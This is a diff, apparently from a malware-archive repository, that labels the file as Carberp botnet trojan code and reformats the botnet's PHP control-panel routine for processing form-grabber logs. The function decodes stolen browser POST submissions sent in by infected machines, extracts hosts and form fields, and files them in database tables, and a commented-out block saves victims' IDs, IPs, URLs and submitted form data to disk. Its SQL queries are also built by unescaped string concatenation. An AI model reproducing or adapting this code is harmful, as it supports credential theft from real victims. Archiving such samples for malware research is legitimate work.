@@ -1,10 +1,24 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
-if(!function_exists('get_formgrabber')){	function get_formgrabber($log){		global $dir, $geoip_ex, $mysqli, $gi, $filters, $task, $fs, $cb;
+if(!function_exists('get_formgrabber')){
+	function get_formgrabber($log){
+		global $dir, $geoip_ex, $mysqli, $gi, $filters, $task, $fs, $cb;
 
 		if($task->unnecessary != true){
 			$match = explode('[~]', $log);
-		}else{			$match = explode("[~]\r\n\r\n", $log);
+		}else{
+			$match = explode("[~]\r\n\r\n", $log);
 		}
 
 		$log = '';
@@ -14,11 +28,14 @@ if(!function_exists('get_formgrabber')){	function get_formgrabber($log){		glob
 
 		if($abp > 0){
 			foreach($match as $item){
-				if($task->unnecessary != true){					$mitem = explode('[,]', $item);
-				}else{					$mitem = explode("[,]\r\n", $item);
+				if($task->unnecessary != true){
+					$mitem = explode('[,]', $item);
+				}else{
+					$mitem = explode("[,]\r\n", $item);
 				}
 
-        		if(count($mitem) == 5){        			if($task->unnecessary != true) $mitem[4] = @base64_decode($mitem[4]);
+        		if(count($mitem) == 5){
+        			if($task->unnecessary != true) $mitem[4] = @base64_decode($mitem[4]);
             		$log_start = $mitem[4];
 	        		$mitem[4] = explode('|POST:', $mitem[4], 2);
 
@@ -28,7 +45,8 @@ if(!function_exists('get_formgrabber')){	function get_formgrabber($log){		glob
 	        		if(stripos($mitem[4][0], 'http://') === 0){
 	        			$mitem['host'] = $host = get_host(preg_replace('~\((.*)\)~is', '', preg_replace('~[ ]+~is', '', $mitem[4][0])));
 	        			$mitem['port'] = $port = @parse_url($mitem[4][0], PHP_URL_PORT);
-	        		}elseif(stripos($mitem[4][0], 'https://') === 0){	        			$mitem['host'] = $host = get_host(preg_replace('~\((.*)\)~is', '', preg_replace('~[ ]+~is', '', $mitem[4][0])));
+	        		}elseif(stripos($mitem[4][0], 'https://') === 0){
+	        			$mitem['host'] = $host = get_host(preg_replace('~\((.*)\)~is', '', preg_replace('~[ ]+~is', '', $mitem[4][0])));
 	        			$mitem['port'] = $port = @parse_url($mitem[4][0], PHP_URL_PORT);
 	        		}elseif(stripos($mitem[4][0], 'site://') === 0){
 	        			$mitem[4][0] = preg_replace('~\((.*)\)~is', '', preg_replace('~[ ]+~is', '', str_replace('site://', 'http://', $mitem[4][0])));
@@ -65,15 +83,18 @@ if(!function_exists('get_formgrabber')){	function get_formgrabber($log){		glob
 							parse_str($mitem[4][1], $keys);
 							$keys = array_keys($keys);
 							foreach($keys as $i => $key){
-								if(strlen($key) <= 32){									$mysqli->query('update bf_filters set fields = concat(fields, \''.$key.',\') WHERE (id = \''.$filters[$host]['id'].'\') AND (fields NOT LIKE \'%'.$key.',%\') LIMIT 1');
-								}else{									unset($keys[$i]);
+								if(strlen($key) <= 32){
+									$mysqli->query('update bf_filters set fields = concat(fields, \''.$key.',\') WHERE (id = \''.$filters[$host]['id'].'\') AND (fields NOT LIKE \'%'.$key.',%\') LIMIT 1');
+								}else{
+									unset($keys[$i]);
 								}
 							}
 
 							if(count($keys) > 0){
 								$mysqli->query("INSERT DELAYED INTO bf_filter_".$filters[$host]['id']." (prefix, uid, country, md5_hash, program, type, post_date, url, fields, data, size) VALUES ('".$mitem[0]."', '".$mitem[1]."', '".$mitem['country']."', '".md5(implode('', $mitem[4]) . $task->type)."', '".$mitem['b']."', '".$task->type."', NOW(), '".urlencode($mitem[4][0])."', '".implode(',', $keys)."', '".urlencode($mitem[4][1])."', '".strlen($mitem[4][1])."')");
                                 /*
-							    if($filters[$host]['save_log'] == '1'){							    	$mysqli->query('INSERT DELAYED INTO bf_filters_save (host, file, type) VALUES (\''.$host.'\', \''.md5($host).'\', \''.$task->type.'\')');
+							    if($filters[$host]['save_log'] == '1'){
+							    	$mysqli->query('INSERT DELAYED INTO bf_filters_save (host, file, type) VALUES (\''.$host.'\', \''.md5($host).'\', \''.$task->type.'\')');
 							    	file_put_contents($dir['s'][$task->type] . '/' . md5($host), '<ID: '.$mitem[0].$mitem[1].' BROWSER: '.$mitem['b'].' IP: '.$mitem[2].' ('.$mitem['country'].')>' . "\r\n" . 'URL:' . "\r\n" . $mitem[4][0] . "\r\n" . 'POST:' . "\r\n" . str_replace('&', "\r\n", $mitem[4][1]) . "\r\n" . '#END#' . "\r\n\r\n", FILE_APPEND);
 							    }
 							    */
